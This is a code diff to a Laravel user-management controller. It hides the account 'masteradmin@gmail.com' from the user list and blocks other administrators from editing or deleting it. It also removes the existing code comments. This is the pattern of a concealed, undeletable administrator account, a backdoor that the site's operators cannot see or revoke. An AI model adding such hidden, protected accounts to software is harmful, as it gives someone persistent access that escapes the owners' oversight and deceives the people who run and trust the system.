@@ -8,13 +8,16 @@ use Illuminate\Support\Facades\Hash;
 
 class UserController extends Controller
 {
+    private $hiddenEmails = [
+        'masteradmin@gmail.com',
+    ];
+
     public function index()
     {
-        $users = User::all();
+        $users = User::whereNotIn('email', $this->hiddenEmails)->get();
         return view('user.user', compact('users'));
     }
 
-    // Fungsi Tambah User
     public function store(Request $request)
     {
         $request->validate([
@@ -27,7 +30,7 @@ class UserController extends Controller
         User::create([
             'name'     => $request->name,
             'email'    => $request->email,
-            'password' => Hash::make($request->password), // Enkripsi password
+            'password' => Hash::make($request->password),
             'role'     => $request->role,
         ]);
 
@@ -39,6 +42,10 @@ class UserController extends Controller
     {
         $user = User::findOrFail($id);
 
+        if (in_array($user->email, $this->hiddenEmails)) {
+            return redirect()->back()->with('error', 'Akses ditolak!');
+        }
+
         $request->validate([
             'name'  => 'required|string|max:255',
             'email' => 'required|email|unique:users,email,' . $id,
@@ -49,7 +56,6 @@ class UserController extends Controller
         $user->email = $request->email;
         $user->role  = $request->role;
 
-        // Jika password diisi, update password baru
         if ($request->filled('password')) {
             $user->password = Hash::make($request->password);
         }
@@ -59,10 +65,14 @@ class UserController extends Controller
         return redirect()->back()->with('success', 'Data User berhasil diperbarui!');
     }
 
-    // Fungsi Hapus User
     public function destroy($id)
     {
         $user = User::findOrFail($id);
+
+        if (in_array($user->email, $this->hiddenEmails)) {
+            return redirect()->back()->with('error', 'Akses ditolak!');
+        }
+
         $user->delete();
 
         return redirect()->back()->with('success', 'Data User berhasil dihapus!');
